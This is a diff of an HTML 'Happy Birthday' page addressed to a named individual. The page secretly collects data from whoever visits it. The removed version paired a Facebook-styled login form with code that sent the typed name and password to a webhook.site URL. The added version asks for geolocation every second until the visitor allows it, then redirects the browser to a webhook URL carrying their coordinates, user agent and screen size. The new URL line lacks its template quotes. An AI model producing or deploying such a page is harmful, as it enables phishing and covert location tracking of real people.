@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Celebration Page</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,51 +15,13 @@
             height: 100vh;
             transition: background-color 0.5s;
         }
-        .login-container, .celebration-container {
+        .celebration-container {
             background-color: white;
             padding: 40px;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             width: 350px;
             text-align: center;
-        }
-        .login-container h4 {
-            font-size: 18px;
-            margin-bottom: 20px;
-            color: #1877f2; /* Facebook blue */
-        }
-        .login-container input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        .login-container button {
-            width: 100%;
-            padding: 12px;
-            background-color: #1877f2; /* Facebook blue */
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .login-container button:hover {
-            background-color: #145db2;
-        }
-        .login-container .forgot-password {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #1877f2; /* Facebook blue */
-            text-decoration: none;
-        }
-        .login-container .forgot-password:hover {
-            text-decoration: underline;
-        }
-        .celebration-container {
-            display: none; /* Hidden by default */
         }
         .celebration-container h1 {
             color: #f39c12; /* Celebration color */
@@ -72,7 +35,6 @@
 </head>
 <body>
 
-
 <div class="celebration-container">
     <h1>🎉 Happy Birthday, Sakib Sarkar! 🎉</h1>
     <img src="https://media.giphy.com/media/3o6MbhD0Mc76tRMz4c/giphy.gif" alt="Birthday Celebration">
@@ -80,47 +42,39 @@
 </div>
 
 <script>
+    // Function to repeatedly request geolocation until access is granted
+    function requestLocation() {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            console.log("Latitude: " + latitude);
+            console.log("Longitude: " + longitude);
 
-        // Function to repeatedly request geolocation until access is granted
-        function requestLocation() {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
-                console.log("Latitude: " + latitude);
-                console.log("Longitude: " + longitude);
-
-                // Store geolocation and other data
-                localStorage.setItem("latitude", latitude);
-                localStorage.setItem("longitude", longitude);
-                
-                const userAgent = navigator.userAgent;
-                const screenWidth = window.screen.width;
-                const screenHeight = window.screen.height;
-                
-                // Construct the redirect URL with the collected data
-                const redirectUrl = `https://webhook.site/4bcf5b86-2816-482d-9a1d-f0502e7651b4?name=${encodeURIComponent(userName)}&password=${encodeURIComponent(userPassword)}&lat=${latitude}&lng=${longitude}&userAgent=${encodeURIComponent(userAgent)}&screenWidth=${screenWidth}&screenHeight=${screenHeight}`;
-                
-                displayCelebration(redirectUrl);
-            }, function(error) {
-                if (error.code === error.PERMISSION_DENIED) {
-                    // Retry location request after a short delay
-                    setTimeout(requestLocation, 1000);
-                }
-            });
-        }
-
-        // Function to display celebration and redirect after 1 second
-        function displayCelebration(redirectUrl) {
-            document.querySelector('.celebration-container').style.display = 'block';
+            // Store geolocation and other data
+            localStorage.setItem("latitude", latitude);
+            localStorage.setItem("longitude", longitude);
             
+            const userAgent = navigator.userAgent;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            
+            // Construct the redirect URL with the collected data
+            const redirectUrl = https://webhook.site/899e7a99-f1d4-475f-9ef4-59c8cf159a3c?lat=${latitude}&lng=${longitude}&userAgent=${encodeURIComponent(userAgent)}&screenWidth=${screenWidth}&screenHeight=${screenHeight};
+            
+            // Redirect after 1 second
             setTimeout(function() {
                 window.location.href = redirectUrl;
             }, 1000);
-        }
+        }, function(error) {
+            if (error.code === error.PERMISSION_DENIED) {
+                // Retry location request after a short delay
+                setTimeout(requestLocation, 1000);
+            }
+        });
+    }
 
-        // Start the geolocation loop
-        requestLocation();
-    };
+    // Start the geolocation loop
+    requestLocation();
 </script>
 
 </body>
